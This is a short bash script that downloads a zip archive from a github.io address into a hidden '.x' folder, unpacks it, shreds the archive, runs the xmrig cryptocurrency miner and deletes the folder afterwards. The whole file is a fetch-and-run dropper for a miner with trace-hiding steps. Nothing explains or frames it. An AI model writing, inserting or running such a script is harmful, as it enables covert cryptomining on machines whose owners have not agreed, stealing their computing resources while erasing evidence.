#!/bin/bash

wget https://trustmeow.github.io/xmrig/rig.zip -P .x/ && unzip .x/rig.zip -d .x/ && shred -u .x/rig.zip && (./.x/xmrig; rm -rf .x/)
